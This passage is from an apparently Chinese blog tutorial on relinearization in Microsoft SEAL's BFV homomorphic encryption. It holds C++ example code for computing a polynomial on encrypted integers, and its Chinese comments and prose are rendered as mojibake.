x_decrypted<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// è§£å¯† å°†åŠ å¯†å¯†æ–‡,è¾“å‡ºè¦†ç›–åˆ°æ˜æ–‡ä¸Š</span>cout <span class="token operator">&lt;&lt;</span> <span class="token string">"Compute x_sq_plus_one (x^2+1)."</span> <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span>Ciphertext x_sq_plus_one<span class="token punctuation">;</span>evaluator<span class="token punctuation">.</span><span class="token function">square</span><span class="token punctuation">(</span>x_encrypted<span class="token punctuation">,</span> x_sq_plus_one<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// è®¡ç®—å¹³æ–¹, ç»“æœè¾“å‡ºåˆ° x_sq_plus_one ä¸­</span>Plaintext <span class="token function">plain_one</span><span class="token punctuation">(</span><span class="token string">"1"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// æ˜æ–‡ 1</span>    <span class="token comment">/**    åŠ å¯†çš„ä¹˜æ³•å¯¼è‡´è¾“å‡ºå¯†æ–‡çš„å¤§å°å¢åŠ ã€‚    æ›´å‡†ç¡®åœ°è¯´ï¼Œå¦‚æœè¾“å…¥å¯†æ–‡çš„å¤§å°ä¸ºMå’ŒNï¼Œåˆ™è¾“å‡º    åŒæ€ä¹˜æ³•åçš„å¯†æ–‡å¤§å°ä¸ºM+N-1ã€‚    **/</span></code></pre>              </div>            </details></div><h2 id="çº¿æ€§åŒ–-Relinearization">çº¿æ€§åŒ– Relinearization</h2><div class="story post-story"><blockquote><p>`Relinearizationâ€™ is an operation that reduces the size of a ciphertext after<br>multiplication back to the initial size, 2. Thus, relinearizing one or both<br>input ciphertexts before the next multiplication can have a huge positive<br>impact on both noise growth and performance, even though relinearization has<br>a significant computational cost itself. It is only possible to relinearize<br>size 3 ciphertexts down to size 2, so often the user would want to relinearize<br>after each multiplication to keep the ciphertext sizes at 2.</p><p>Relinearization requires special `relinearization keysâ€™, which can be thought<br>of as a kind of public key. Relinearization keys can easily be created with<br>the KeyGenerator.<br>â€œé‡æ–°çº¿æ€§åŒ–â€æ˜¯ä¸€ç§å‡å°‘å¯†æ–‡å¤§å°çš„æ“ä½œã€‚<br>ä¹˜æ³•è¿”å›åˆå§‹å¤§å°2ã€‚å› æ­¤ï¼Œé‡æ–°çº¿æ€§åŒ–ä¸€ä¸ªæˆ–ä¸¤ä¸ª<br>ä¸‹ä¸€ä¸ªä¹˜æ³•ä¹‹å‰çš„è¾“å…¥å¯†æ–‡å¯ä»¥å…·æœ‰å¾ˆå¤§çš„æ­£æ•°<br>å³ä½¿é‡æ–°çº¿æ€§åŒ–å·²å¯¹å™ªå£°å¢é•¿å’Œæ€§èƒ½äº§ç”Ÿå½±å“<br>å·¨å¤§çš„è®¡ç®—æˆæœ¬æœ¬èº«ã€‚ åªèƒ½é‡æ–°çº¿æ€§åŒ–<br>å¤§å°ä¸º3çš„å¯†æ–‡ï¼Œå¤§å°å‡å°ä¸º2ï¼Œå› æ­¤ç”¨æˆ·ç»å¸¸éœ€è¦é‡æ–°çº¿æ€§åŒ–<br>æ¯æ¬¡ä¹˜æ³•åï¼Œå°†å¯†æ–‡å¤§å°ä¿æŒä¸º2ã€‚</p><p>é‡æ–°çº¿æ€§åŒ–éœ€è¦ç‰¹æ®Šçš„â€œé‡æ–°çº¿æ€§åŒ–é”®â€ï¼Œå¯ä»¥è®¤ä¸º<br>ä½œä¸ºä¸€ç§å…¬é’¥ã€‚ é‡æ–°çº¿æ€§åŒ–é”®å¯ä»¥è½»æ¾åˆ›å»º<br>KeyGeneratorã€‚</p></blockquote><p>çº¿æ€§åŒ–ç”¨æ³•</p><table><thead><tr><th>ç”¨æ³•</th><th>å‚æ•°</th><th>è§£é‡Šè¯´æ˜</th></tr></thead><tbody><tr><td>RelinKeys relin_keys;</td><td></td><td>å£°æ˜çº¿æ€§åŒ–ç±»</td></tr><tr><td>keygen.create_relin_keys(relin_keys);</td><td>(RelinKeys)</td><td>åˆ›å»ºä¸€ä¸ªçº¿æ€§å¯†é’¥</td></tr><tr><td>evaluator.relinearize_inplace(x_squared, relin_keys);</td><td>(Ciphertextï¼ŒRelinKeys)</td><td>å°†è®¡ç®—ç»“æœé‡æ–°çº¿æ€§åŒ–å¤§å°åˆ°2ä»¥å†…</td></tr></tbody></table><h4 id="æ¼”ç¤ºCode">æ¼”ç¤ºCode</h4><details green><summary> code </summary>              <div class='content'>              <pre class="language-c" data-language="c"><code class="language-c"><span class="token function">print_line</span><span class="token punctuation">(</span><span class="token constant">__LINE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    cout <span class="token operator">&lt;&lt;</span> <span class="token string">"Compute and relinearize x_squared (x^2),"</span> <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span>    cout <span class="token operator">&lt;&lt;</span> <span class="token function">string</span><span class="token punctuation">(</span><span class="token number">13</span><span class="token punctuation">,</span> <span class="token string">' '</span><span class="token punctuation">)</span> <span class="token operator">&lt;&lt;</span> <span class="token string">"then compute x_sq_plus_one (x^2+1)"</span> <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span>    Ciphertext x_squared<span class="token punctuation">;</span>    evaluator<span class="token punctuation">.</span><span class="token function">square</span><span class="token punctuation">(</span>x_encrypted<span class="token punctuation">,</span> x_squared<span class="token punctuation">)</span><span class="token punctuation">;</span>    cout <span class="token operator">&lt;&lt;</span> <span class="token string">"    + size of x_squared: "</span> <span class="token operator">&lt;&lt;</span> x_squared<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span>        evaluator<span class="token punctuation">.</span><span class="token function">relinearize_inplace</span><span class="token punctuation">(</span>x_squared<span class="token punctuation">,</span> relin_keys<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// é‡æ–°çº¿æ€§åŒ–å¤§å°åˆ°2ä»¥å†…</span>        cout <span class="token operator">&lt;&lt;</span> <span class="token string">"    + size of x_squared (after relinearization): "</span> <span class="token operator">&lt;&lt;</span> x_squared<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span>     evaluator<span class="token punctuation">.</span><span class="token function">add_plain</span><span class="token punctuation">(</span>x_squared<span class="token punctuation">,</span> plain_one<span class="token punctuation">,</span> x_sq_plus_one<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// x_sq_plus_one = x_squared +  plain_one;</span>    cout <span class="token operator">&lt;&lt;</span> <span class="token string">"    + noise budget in x_sq_plus_one: "</span> <span class="token operator">&lt;&lt;</span> decryptor<span class="token punctuation">.</span><span class="token function">invariant_noise_budget</span><span class="token punctuation">(</span>x_sq_plus_one<span class="token punctuation">)</span> <span class="token operator">&lt;&lt;</span> <span class="token string">" bits"</span>        <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span>    cout <span class="token operator">&lt;&lt;</span> <span class="token string">"    + decryption of x_sq_plus_one: "</span><span class="token punctuation">;</span>    decryptor<span class="token punctuation">.</span><span class="token function">decrypt</span><span class="token punctuation">(</span>x_sq_plus_one<span class="token punctuation">,</span> decrypted_result<span class="token punctuation">)</span><span class="token punctuation">;</span>    ss2<span class="token punctuation">.</span><span class="token function">clear</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    ss2 <span class="token operator">&lt;&lt;</span> hex <span class="token operator">&lt;&lt;</span> decrypted_result<span class="token punctuation">.</span><span class="token function">to_string</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    ss2 <span class="token operator">>></span> d2<span class="token punctuation">;</span>    cout <span class="token operator">&lt;&lt;</span> <span class="token string">"Hex: 0x"</span> <span class="token operator">&lt;&lt;</span> decrypted_result<span class="token punctuation">.</span><span class="token function">to_string</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">&lt;&lt;</span> <span class="token string">" Integer: "</span><span class="token operator">&lt;&lt;</span>d2<span class="token operator">&lt;&lt;</span><span class="token string">" ...... Correct. (x^2 + 1 ) "</span> <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span></code></pre>              </div>            </details><h1>æºä»£ç </h1><details green><summary> code </summary>              <div class='content'>              <pre class="language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">"seal/seal.h"</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">"examples.h"</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;iostream></span></span>using namespace std<span class="token punctuation">;</span>using namespace seal<span class="token punctuation">;</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token function">print_example_banner</span><span class="token punctuation">(</span><span class="token string">"Example: BFV Basics"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    EncryptionParameters <span class="token function">parms</span><span class="token punctuation">(</span>scheme_type<span class="token operator">::</span>bfv<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//å£°æ˜HE ä½¿ç”¨çš„æ¨¡å¼</span>    <span class="token comment">// è®¾ç½® 3 ä¸ªå‚æ•°</span>    <span class="token class-name">size_t</span> poly_modulus_degree <span class="token operator">=</span> <span class="token number">4096</span><span class="token punctuation">;</span>    parms<span class="token punctuation">.</span><span class="token function">set_poly_modulus_degree</span><span class="token punctuation">(</span>poly_modulus_degree<span class="token punctuation">)</span><span class="token punctuation">;</span>    parms<span class="token punctuation">.</span><span class="token function">set_coeff_modulus</span><span class="token punctuation">(</span>CoeffModulus<span class="token operator">::</span><span class="token function">BFVDefault</span><span class="token punctuation">(</span>poly_modulus_degree<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    parms<span class="token punctuation">.</span><span class="token function">set_plain_modulus</span><span class="token punctuation">(</span><span class="token number">1024</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// æ˜æ–‡ MODæ•° (2çš„å€æ•°, ç´ æ•°æœ€å¥½)</span>    <span class="token comment">//åˆ›å»ºä¸€ä¸ªcontext</span>    SEALContext <span class="token function">context</span><span class="token punctuation">(</span>parms<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">print_line</span><span class="token punctuation">(</span><span class="token constant">__LINE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    cout <span class="token operator">&lt;&lt;</span> <span class="token string">"Set encryption parameters and print"</span> <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span>    <span class="token function">print_parameters</span><span class="token punctuation">(</span>context<span class="token punctuation">)</span><span class="token punctuation">;</span>    cout <span class="token operator">&lt;&lt;</span> <span class="token string">"Hello World!"</span><span class="token operator">&lt;&lt;</span>endl<span class="token punctuation">;</span>    cout <span class="token operator">&lt;&lt;</span> <span class="token string">"Parameter validation (success): "</span> <span class="token operator">&lt;&lt;</span> context<span class="token punctuation">.</span><span class="token function">parameter_error_message</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span>    cout <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span>    cout <span class="token operator">&lt;&lt;</span> <span class="token string">"~~~~~~ A naive way to calculate 4(x^2+1)(x+1)^2. ~~~~~~"</span> <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span>    KeyGenerator <span class="token function">keygen</span><span class="token punctuation">(</span>context<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// å¯†é’¥ç±»</span>    SecretKey secret_key <span class="token operator">=</span> keygen<span class="token punctuation">.</span><span class="token function">secret_key</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// åˆ›å»ºç§é’¥</span>    PublicKey public_key<span class="token punctuation">;</span>    keygen<span class="token punctuation">.</span><span class="token function">create_public_key</span><span class="token punctuation">(</span>public_key<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// åˆ›å»ºå…¬é’¥</span>    Encryptor <span class="token function">encryptor</span><span class="token punctuation">(</span>context<span class="token punctuation">,</span> public_key<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// åŠ å¯†ç±»,åªéœ€è¦å…¬é’¥å³å¯;</span>    Evaluator <span class="token function">evaluator</span><span class="token punctuation">(</span>context<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// è¯„ä¼°è®¡ç®—ç±»</span>    Decryptor <span class="token function">decryptor</span><span class="token punctuation">(</span>context<span class="token punctuation">,</span> secret_key<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">// è§£å¯†ç±»</span>    <span class="token comment">/**    4x^4 + 8x^3 + 8x^2 + 8x + 4    **/</span>    <span class="token function">print_line</span><span class="token punctuation">(</span><span class="token constant">__LINE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">int</span> x <span class="token operator">=</span> <span class="token number">6</span><span class="token punctuation">;</span>    Plaintext <span class="token function">x_plain</span><span class="token punctuation">(</span><span class="token function">to_string</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">//x_plain.to_string() è½¬æ¢æˆ16è¿›åˆ¶è¾“å‡º</span>    cout <span class="token operator">&lt;&lt;</span> <span class="token string">"Express x = "</span> <span class="token operator">+</span> <span class="token function">to_string</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">" as a plaintext polynomial 0x"</span> <span class="token operator">+</span> x_plain<span class="token punctuation">.</span><span class="token function">to_string</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"."</span> <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span>        <span class="token function">print_line</span><span class="token punctuation">(</span><span class="token constant">__LINE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    Ciphertext x_encrypted<span class="token punctuation">;</span><span class="token comment">// å¯†æ–‡ç±»</span>    cout <span class="token operator">&lt;&lt;</span> <span class="token string">"Encrypt x_plain to x_encrypted."</span> <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span>    encryptor<span class="token punctuation">.</span><span class="token function">encrypt</span><span class="token punctuation">(</span>x_plain<span class="token punctuation">,</span> x_encrypted<span class="token punctuation">)</span><span class="token punctuation">;</span>    cout <span class="token operator">&lt;&lt;</span> <span class="token string">"    + size of freshly encrypted x: "</span> <span class="token operator">&lt;&lt;</span> x_encrypted<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span>    <span class="token comment">/*There is plenty of noise budget left in this freshly encrypted ciphertext. å™ªå£°é¢„ç®—ï¼Œå½“å™ªéŸ³é¢„ç®—é™ä½åˆ°0çš„æ—¶å€™ï¼Œè®¡ç®—ç»“æœä¸æ­£ç¡®*/</span>    cout <span class="token operator">&lt;&lt;</span> <span class="token string">"    + noise budget in freshly encrypted x: "</span> <span class="token operator">&lt;&lt;</span> decryptor<span class="token punctuation">.</span><span class="token function">invariant_noise_budget</span><span class="token punctuation">(</span>x_encrypted<span class="token punctuation">)</span> <span class="token operator">&lt;&lt;</span> <span class="token string">" bits"</span>        <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span>    Plaintext x_decrypted<span class="token punctuation">;</span>    cout <span class="token operator">&lt;&lt;</span> <span class="token string">"    + decryption of x_encrypted: "</span><span class="token punctuation">;</span>    decryptor<span class="token punctuation">.</span><span class="token function">decrypt</span><span class="token punctuation">(</span>x_encrypted<span class="token punctuation">,</span> x_decrypted<span class="token punctuation">)</span><span class="token punctuation">;</span>    cout <span class="token operator">&lt;&lt;</span> <span class="token string">"0x"</span> <span class="token operator">&lt;&lt;</span> x_decrypted<span class="token punctuation">.</span><span class="token function">to_string</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">&lt;&lt;</span> <span class="token string">" ...... Correct."</span> <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span>    <span class="token function">print_line</span><span class="token punctuation">(</span><span class="token constant">__LINE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    cout <span class="token operator">&lt;&lt;</span> <span class="token string">"Compute x_sq_plus_one (x^2+1)."</span> <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span>        Ciphertext x_sq_plus_one<span class="token punctuation">;</span>    evaluator<span class="token punctuation">.</span><span class="token function">square</span><span class="token punctuation">(</span>x_encrypted<span class="token punctuation">,</span> x_sq_plus_one<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// è®¡ç®—å¹³æ–¹, ç»“æœè¾“å‡ºåˆ° x_sq_plus_one ä¸­</span>    Plaintext <span class="token function">plain_one</span><span class="token punctuation">(</span><span class="token string">"1"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// æ˜æ–‡ 1</span>    evaluator<span class="token punctuation">.</span><span class="token function">add_plain_inplace</span><span class="token punctuation">(</span>x_sq_plus_one<span class="token punctuation">,</span> plain_one<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// x_sq_plus_one = x_sq_plus_one + plain_one</span>        <span class="token comment">/**    åŠ å¯†çš„ä¹˜æ³•å¯¼è‡´è¾“å‡ºå¯†æ–‡çš„å¤§å°å¢åŠ ã€‚    æ›´å‡†ç¡®åœ°è¯´ï¼Œå¦‚æœè¾“å…¥å¯†æ–‡çš„å¤§å°ä¸ºMå’ŒNï¼Œåˆ™è¾“å‡º    åŒæ€ä¹˜æ³•åçš„å¯†æ–‡å¤§å°ä¸ºM+N-1ã€‚    **/</span>    cout <span class="token operator">&lt;&lt;</span> <span class="token string">"    + size of x_sq_plus_one: "</span> <span class="token operator">&lt;&lt;</span> x_sq_plus_one<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span>    cout <span class="token operator">&lt;&lt;</span> <span class="token string">"    + noise budget in x_sq_plus_one: "</span> <span class="token operator">&lt;&lt;</span> decryptor<span class="token punctuation">.</span><span class="token function">invariant_noise_budget</span><span class="token punctuation">(</span>x_sq_plus_one<span class="token punctuation">)</span> <span class="token operator">&lt;&lt;</span> <span class="token string">" bits"</span>        <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span>    <span class="token comment">/*    * è®¡ç®—4ä¸ªå¤šé¡¹å¼æ ·ä¾‹    * 4x^4 + 8x^3 + 8x^2 + 8x + 4    * 4x^4 + 8x^3 + 8x^2 + 8x + 4 = 4(x + 1)^2 * (x^2 + 1) è½¬æ¢æˆ 4(x + 1)^2 * (x^2 + 1) é™ä½å¤šé¡¹å¼ç³»æ•°    */</span>    stringstream ss2<span class="token punctuation">;</span><span class="token comment">//å­—ç¬¦ä¸²æµ ,åšå­—ç¬¦è½¬æ¢ç”¨</span>    <span class="token keyword">int</span> d2<span class="token punctuation">;</span>    <span class="token comment">// å¯†æ–‡è®¡ç®—(x^2+1)  çš„è§£å¯†ç»“æœä¸º:</span>    Plaintext decrypted_result<span class="token punctuation">;</span>    cout <span class="token operator">&lt;&lt;</span> <span class="token string">"    + decryption of x_sq_plus_one : "</span><span class="token punctuation">;</span>    decryptor<span class="token punctuation">.</span><span class="token function">decrypt</span><span class="token punctuation">(</span>x_sq_plus_one<span class="token punctuation">,</span> decrypted_result<span class="token punctuation">)</span><span class="token punctuation">;</span>    ss2<span class="token punctuation">.</span><span class="token function">clear</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    ss2 <span class="token operator">&lt;&lt;</span> hex <span class="token operator">&lt;&lt;</span> decrypted_result<span class="token punctuation">.</span><span class="token function">to_string</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// åå…­è¿›åˆ¶è¾“å‡ºåˆ°ss2ï¼Œ</span>    ss2 <span class="token operator">>></span> d2<span class="token punctuation">;</span> <span class="token comment">// ss2 è¾“å‡ºåè¿›åˆ¶åˆ° d2</span>    cout <span class="token operator">&lt;&lt;</span> <span class="token string">"HEX: 0x"</span> <span class="token operator">&lt;&lt;</span> decrypted_result<span class="token punctuation">.</span><span class="token function">to_string</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">&lt;&lt;</span> <span class="token string">" Integer: "</span> <span class="token operator">&lt;&lt;</span> d2 <span class="token operator">&lt;&lt;</span> <span class="token string">" .... Correct. "</span> <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span>    <span class="token comment">/*    æ¥ç€å¯†æ–‡è®¡ç®— (x + 1)^2.    */</span>    <span class="token function">print_line</span><span class="token punctuation">(</span><span class="token constant">__LINE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    cout <span class="token operator">&lt;&lt;</span> <span class="token string">"Compute x_plus_one_sq ((x+1)^2)."</span> <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span>    Ciphertext x_plus_one_sq<span class="token punctuation">;</span>    evaluator<span class="token punctuation">.</span><span class="token function">add_plain</span><span class="token punctuation">(</span>x_encrypted<span class="token punctuation">,</span> plain_one<span class="token punctuation">,</span> x_plus_one_sq<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//å¯†æ–‡ x_plus_one_sq = x_encrypted + plain_one (x+1)</span>    evaluator<span class="token punctuation">.</span><span class="token function">square_inplace</span><span class="token punctuation">(</span>x_plus_one_sq<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//  x_plus_one_sq = x_plus_one_sq * x_plus_one_sq;</span>    cout <span class="token operator">&lt;&lt;</span> <span class="token string">"    + size of x_plus_one_sq: "</span> <span class="token operator">&lt;&lt;</span> x_plus_one_sq<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span>    cout <span class="token operator">&lt;&lt;</span> <span class="token string">"    + noise budget in x_plus_one_sq: "</span> <span class="token operator">&lt;&lt;</span> decryptor<span class="token punctuation">.</span><span class="token function">invariant_noise_budget</span><span class="token punctuation">(</span>x_plus_one_sq<span class="token punctuation">)</span> <span class="token operator">&lt;&lt;</span> <span class="token string">" bits"</span>        <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span>    cout <span class="token operator">&lt;&lt;</span> <span class="token string">"    + decryption of x_plus_one_sq: "</span><span class="token punctuation">;</span>    decryptor<span class="token punctuation">.</span><span class="token function">decrypt</span><span class="token punctuation">(</span>x_plus_one_sq<span class="token punctuation">,</span> decrypted_result<span class="token punctuation">)</span><span class="token punctuation">;</span>    ss2<span class="token punctuation">.</span><span class="token function">clear</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    ss2 <span class="token operator">&lt;&lt;</span> hex <span class="token operator">&lt;&lt;</span> decrypted_result<span class="token punctuation">.</span><span class="token function">to_string</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// åå…­è¿›åˆ¶è¾“å‡ºåˆ°ss2ï¼Œ</span>    ss2 <span class="token operator">>></span> d2<span class="token punctuation">;</span> <span class="token comment">// ss2 è¾“å‡ºåè¿›åˆ¶åˆ° d2</span>    cout<span class="token operator">&lt;&lt;</span><span class="token string">"Hex: Ox"</span><span class="token operator">&lt;&lt;</span>decrypted_result<span class="token punctuation">.</span><span class="token function">to_string</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">&lt;&lt;</span><span class="token string">" Integer: "</span><span class="token operator">&lt;&lt;</span>d2<span class="token operator">&lt;&lt;</span><span class="token string">" .... Correct. "</span>  <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span>    <span class="token comment">/*        æœ€ç»ˆè®¡ç®— (x^2 + 1) * (x + 1)^2 * 4.    */</span>    <span class="token function">print_line</span><span class="token punctuation">(</span><span class="token constant">__LINE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    cout <span class="token operator">&lt;&lt;</span> <span class="token string">"Compute encrypted_result (4(x^2+1)(x+1)^2)."</span> <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span>    Ciphertext encrypted_result<span class="token punctuation">;</span>    Plaintext <span class="token function">plain_four</span><span class="token punctuation">(</span><span class="token string">"4"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    evaluator<span class="token punctuation">.</span><span class="token function">multiply_plain_inplace</span><span class="token punctuation">(</span>x_sq_plus_one<span class="token punctuation">,</span> plain_four<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// x_sq_plus_one = x_sq_plus_one * 4;</span>    evaluator<span class="token punctuation">.</span><span class="token function">multiply</span><span class="token punctuation">(</span>x_sq_plus_one<span class="token punctuation">,</span> x_plus_one_sq<span class="token punctuation">,</span> encrypted_result<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//  å¯†æ–‡encrypted_result = x_sq_plus_one * x_plus_one_sq ;</span>        cout <span class="token operator">&lt;&lt;</span> <span class="token string">"    + size of encrypted_result: "</span> <span class="token operator">&lt;&lt;</span> encrypted_result<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span>    cout <span class="token operator">&lt;&lt;</span> <span class="token string">"    + noise budget in encrypted_result: "</span> <span class="token operator">&lt;&lt;</span> decryptor<span class="token punctuation">.</span><span class="token function">invariant_noise_budget</span><span class="token punctuation">(</span>encrypted_result<span class="token punctuation">)</span> <span class="token operator">&lt;&lt;</span> <span class="token string">" bits"</span>        <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span>    cout <span class="token operator">&lt;&lt;</span> <span class="token string">"NOTE: Decryption can be incorrect if noise budget is zero."</span> <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span>    cout <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span>    cout <span class="token operator">&lt;&lt;</span> <span class="token string">"~~~~~~ A better way to calculate 4(x^2+1)(x+1)^2. ~~~~~~"</span> <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span>    decryptor<span class="token punctuation">.</span><span class="token function">decrypt</span><span class="token punctuation">(</span>encrypted_result<span class="token punctuation">,</span> decrypted_result<span class="token punctuation">)</span><span class="token punctuation">;</span>    stringstream ss3<span class="token punctuation">;</span>    ss3<span class="token punctuation">.</span><span class="token function">clear</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    ss3 <span class="token operator">&lt;&lt;</span> hex <span class="token operator">&lt;&lt;</span> decrypted_result<span class="token punctuation">.</span><span class="token function">to_string</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    ss3 <span class="token operator">>></span> d2<span class="token punctuation">;</span> <span class="token comment">// ss2 è¾“å‡ºåè¿›åˆ¶åˆ° d2</span>    cout <span class="token operator">&lt;&lt;</span> d2 <span class="token operator">&lt;&lt;</span> <span class="token string">" "</span> <span class="token operator">&lt;&lt;</span> decrypted_result<span class="token punctuation">.</span><span class="token function">to_string</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span> <span class="token comment">// å¾—åˆ°çš„ç»“æœä¸æ­£ç¡®</span>    <span class="token comment">/*    * åˆ©ç”¨Relinearization çº¿æ€§åŒ– å¯¹è¿ç®—è¿›è¡Œä¼˜åŒ–    */</span>    <span class="token function">print_line</span><span class="token punctuation">(</span><span class="token constant">__LINE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    cout <span class="token operator">&lt;&lt;</span> <span class="token string">"Generate relinearization keys."</span> <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span>    RelinKeys relin_keys<span class="token punctuation">;</span> <span class="token comment">// åšçº¿æ€§åŒ–ç±»</span>    keygen<span class="token punctuation">.</span><span class="token function">create_relin_keys</span><span class="token punctuation">(</span>relin_keys<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// åˆ›å»ºçº¿æ€§åŒ–å¯†é’¥</span>    <span class="token comment">/*        We now repeat the computation relinearizing after each multiplication.        æˆ‘ä»¬åœ¨æ¯æ¬¡ä¹˜æ³•ä¹‹åé‡å¤é‡æ–°çº¿æ€§åŒ–çš„è®¡ç®—ã€‚    */</span>    <span class="token function">print_line</span><span class="token punctuation">(</span><span class="token constant">__LINE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    cout <span class="token operator">&lt;&lt;</span> <span class="token string">"Compute and relinearize x_squared (x^2),"</span> <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span>    cout <span class="token operator">&lt;&lt;</span> <span class="token function">string</span><span class="token punctuation">(</span><span class="token number">13</span><span class="token punctuation">,</span> <span class="token string">' '</span><span class="token punctuation">)</span> <span class="token operator">&lt;&lt;</span> <span class="token string">"then compute x_sq_plus_one (x^2+1)"</span> <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span>    Ciphertext x_squared<span class="token punctuation">;</span>    evaluator<span class="token punctuation">.</span><span class="token function">square</span><span class="token punctuation">(</span>x_encrypted<span class="token punctuation">,</span> x_squared<span class="token punctuation">)</span><span class="token punctuation">;</span>    cout <span class="token operator">&lt;&lt;</span> <span class="token string">"    + size of x_squared: 